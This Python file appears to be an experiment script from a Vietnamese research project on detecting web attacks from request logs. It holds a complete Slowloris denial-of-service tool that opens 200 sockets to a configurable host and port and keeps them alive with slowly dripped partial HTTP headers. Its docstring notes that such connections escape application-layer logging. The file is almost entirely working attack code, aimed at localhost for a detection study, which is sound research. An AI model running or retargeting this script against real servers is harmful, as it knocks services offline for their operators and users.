"""
experiments/attack_slowloris.py
4.1.2 Mô phỏng Slow HTTP (Slowloris) - mở nhiều kết nối, gửi header rất chậm để
giữ kết nối lâu, làm cạn kiệt connection pool của server.

QUAN TRỌNG (nên đưa vào mục 4.5 - Hạn chế): vì Traffic Collector (3.2) chỉ ghi
log SAU KHI request được ASGI server hoàn tất parse header, các kết nối Slowloris
cố tình KHÔNG BAO GIỜ hoàn tất header sẽ không xuất hiện trong log ở tầng ứng
dụng. Đây là một hạn chế thật của thiết kế "dựa trên request log tầng ứng dụng",
và là một phát hiện thực nghiệm có giá trị để thảo luận trong 4.5: hệ thống cần
bổ sung đặc trưng ở tầng kết nối (ví dụ số connection đang mở, qua nginx
stub_status hoặc netstat) nếu muốn phát hiện tốt dạng tấn công low-and-slow này.

Chạy: python experiments/attack_slowloris.py
"""
import random
import socket
import time
from pathlib import Path

TARGET_HOST = "localhost"
TARGET_PORT = 8000
NUM_SOCKETS = 200
DURATION_S = 30

LOG_DIR = Path(__file__).resolve().parent.parent / "logs"
LOG_DIR.mkdir(exist_ok=True)


def init_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((TARGET_HOST, TARGET_PORT))
    s.send(f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\n".encode())
    s.send(f"Host: {TARGET_HOST}\r\n".encode())
    s.send(b"User-Agent: Mozilla/5.0\r\n")
    s.send(b"Accept-language: en-US,en,q=0.5\r\n")
    return s


def main():
    start = time.time()
    with open(LOG_DIR / "attack_start.log", "a") as f:
        f.write(f"slowloris_start\t{start}\n")

    sockets = []
    for _ in range(NUM_SOCKETS):
        try:
            sockets.append(init_socket())
        except OSError:
            pass

    print(f"Đã mở {len(sockets)} kết nối slowloris, giữ trong {DURATION_S}s")

    stop_at = time.time() + DURATION_S
    while time.time() < stop_at:
        for s in list(sockets):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            except OSError:
                sockets.remove(s)
        time.sleep(10)

    for s in sockets:
        try:
            s.close()
        except OSError:
            pass
    print("Slowloris kết thúc")


if __name__ == "__main__":
    main()
